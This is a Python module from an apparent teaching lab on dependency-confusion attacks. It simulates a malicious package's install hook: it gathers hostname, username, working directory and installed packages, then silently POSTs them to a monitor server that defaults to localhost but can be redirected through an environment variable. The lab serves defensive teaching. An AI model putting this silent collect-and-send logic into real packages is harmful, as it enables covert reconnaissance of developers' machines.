"""
=============================================================================
 EDUCATIONAL DEMONSTRATION CODE — DEPENDENCY CONFUSION LAB
=============================================================================
This module simulates the "payload" that a dependency-confusion package would
run at install time. It is deliberately BENIGN and LOCAL-ONLY:

  * It collects only NON-SENSITIVE host metadata (hostname, username, python
    version, cwd, a short list of installed package names). It does NOT read
    files, environment secrets, SSH keys, tokens, or anything private.
  * It sends that metadata to a monitoring server on 127.0.0.1 (localhost)
    so a student can *watch* the mechanism. It never contacts the internet.
  * If the monitor is not running, it fails silently — exactly like real
    malware would, to avoid breaking the install and drawing attention.

The point of the lab is to make the *mechanism* observable, then to detect and
defend against it. Do not copy this collection logic into any real package.
=============================================================================
"""
from __future__ import annotations

import getpass
import json
import os
import platform
import socket
import sys
import time
import urllib.request

# Hard-coded loopback sink. Changing this to anything non-local is OUT OF SCOPE
# for this lab and would turn a teaching aid into real malware.
_MONITOR_URL = os.environ.get("SCSIM_MONITOR_URL", "http://127.0.0.1:8888/collect")
_TIMEOUT = 3


def _non_sensitive_metadata(stage: str) -> dict:
    """Gather only harmless, non-identifying system facts."""
    try:
        installed = _short_installed_list()
    except Exception:
        installed = []
    return {
        "stage": stage,                      # "build" or "post-install" or "import"
        "package": "internal-auth-utils",
        "package_version": "99.0.0",
        "hostname": socket.gethostname(),
        "username": getpass.getuser(),
        "python_version": platform.python_version(),
        "platform": platform.platform(),
        "cwd": os.getcwd(),
        "installed_packages_sample": installed,
        "collected_at": time.strftime("%Y-%m-%dT%H:%M:%S", time.localtime()),
        # A flag the monitor uses to label this unmistakably as lab data.
        "lab": True,
    }


def _short_installed_list(limit: int = 25) -> list[str]:
    """Names only (no versions, no paths). Illustrates what an attacker could
    learn about an internal environment — nothing secret, just package names."""
    try:
        from importlib import metadata as importlib_metadata
    except Exception:  # pragma: no cover
        return []
    names = sorted({d.metadata["Name"] for d in importlib_metadata.distributions()
                    if d.metadata.get("Name")})
    return names[:limit]


def collect_and_report(stage: str = "post-install") -> dict:
    """Collect benign metadata and POST it to the localhost monitor.

    Returns the payload dict so callers/tests can inspect it. Never raises:
    a real install hook must not crash the install, or it would be noticed.
    """
    payload = _non_sensitive_metadata(stage)
    data = json.dumps(payload).encode("utf-8")
    try:
        req = urllib.request.Request(
            _MONITOR_URL,
            data=data,
            headers={"Content-Type": "application/json",
                     "User-Agent": "internal-auth-utils/99.0.0 (setup-hook)"},
            method="POST",
        )
        # nosec: loopback only, by design of this lab.
        urllib.request.urlopen(req, timeout=_TIMEOUT)  # noqa: S310
    except Exception:
        # Silent failure mirrors real malware behavior and keeps the lab robust
        # when the monitor isn't up yet.
        pass
    return payload


if __name__ == "__main__":
    # Allow manual inspection: `python -m internal_auth_utils._telemetry`
    import pprint
    pprint.pprint(collect_and_report(stage="manual"))
